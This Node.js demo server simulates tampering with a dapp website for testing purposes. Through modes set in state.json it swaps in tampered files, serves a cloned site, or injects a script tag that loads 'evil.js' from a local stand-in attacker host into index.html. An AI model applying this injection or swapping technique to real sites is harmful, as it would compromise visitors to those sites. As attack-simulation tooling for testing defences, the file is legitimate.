// Demo dapp server. Reads state.json on every request, so attack.mjs can switch
// modes while the server keeps running. See docs/demo.md.
import { readFile, stat } from 'node:fs/promises';
import { createServer } from 'node:http';
import { extname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const PORT = 8080;
const DEMO_DIR = fileURLToPath(new URL('.', import.meta.url));
const SITE_DIR = join(DEMO_DIR, 'site');
const TAMPERED_DIR = join(DEMO_DIR, 'tampered');
const CLONE_DIR = join(DEMO_DIR, 'clone');
const STATE_FILE = join(DEMO_DIR, 'state.json');

const MODES = ['reset', 'swap', 'inject', 'hijack'];
const EVIL_TAG = '<script src="http://localhost:9090/evil.js"></script>';
const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
};

/** A fresh checkout has no state.json and serves the genuine site. Anything else invalid throws. */
async function readState() {
  let raw;
  try {
    raw = await readFile(STATE_FILE, 'utf8');
  } catch (err) {
    if (err.code === 'ENOENT') return { mode: 'reset' };
    throw err;
  }
  const state = JSON.parse(raw);
  if (!MODES.includes(state.mode)) throw new Error(`unknown mode in state.json: ${state.mode}`);
  if (state.mode === 'swap' && typeof state.target !== 'string') {
    throw new Error('swap mode needs a target in state.json');
  }
  return state;
}

/** Joining onto "/" collapses every "..", so the result can't climb out of a served directory. */
function toRelativePath(path) {
  return join('/', path).slice(1);
}

async function isFile(path) {
  try {
    return (await stat(path)).isFile();
  } catch {
    return false;
  }
}

/** Finds the file a request means, trying static-export routes: /stake -> stake/index.html or stake.html. */
async function findFile(root, relPath) {
  for (const candidate of [relPath, join(relPath, 'index.html'), `${relPath}.html`]) {
    if (await isFile(join(root, candidate))) return candidate;
  }
  return null;
}

function injectEvilScript(html) {
  const text = html.toString('utf8');
  // Never serve an "attack" that silently did nothing: the demo would look like a false block or pass.
  if (!text.includes('</head>')) throw new Error('inject mode: index.html has no </head>');
  return text.replace('</head>', `${EVIL_TAG}</head>`);
}

/** Applies the current mode to a request. Returns the file and body to send, or null for a 404. */
async function resolveResponse(state, requestPath) {
  const root = state.mode === 'hijack' ? CLONE_DIR : SITE_DIR;
  const file = await findFile(root, requestPath);
  if (file === null) return null;

  if (state.mode === 'swap' && file === toRelativePath(state.target)) {
    return { file, body: await readFile(join(TAMPERED_DIR, file)) };
  }
  const body = await readFile(join(root, file));
  if (state.mode === 'inject' && file === 'index.html') {
    return { file, body: injectEvilScript(body) };
  }
  return { file, body };
}

function send(req, res, status, contentType, body) {
  res.writeHead(status, {
    'Content-Type': contentType,
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store',
  });
  res.end(req.method === 'HEAD' ? undefined : body);
}

async function handle(req, res) {
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    return send(req, res, 405, 'text/plain', 'method not allowed\n');
  }
  let requestPath;
  try {
    requestPath = toRelativePath(decodeURIComponent(new URL(req.url, 'http://localhost').pathname));
  } catch {
    return send(req, res, 400, 'text/plain', 'bad request path\n');
  }
  const response = await resolveResponse(await readState(), requestPath);
  if (response === null) return send(req, res, 404, 'text/plain', 'not found\n');

  const contentType = CONTENT_TYPES[extname(response.file)] ?? 'application/octet-stream';
  send(req, res, 200, contentType, response.body);
}

createServer((req, res) => {
  handle(req, res).catch((err) => {
    console.error(`${req.method} ${req.url}: ${err.message}`);
    send(req, res, 500, 'text/plain', `demo server error: ${err.message}\n`);
  });
}).listen(PORT, 'localhost', () => {
  console.log(`demo site on http://localhost:${PORT}`);
});
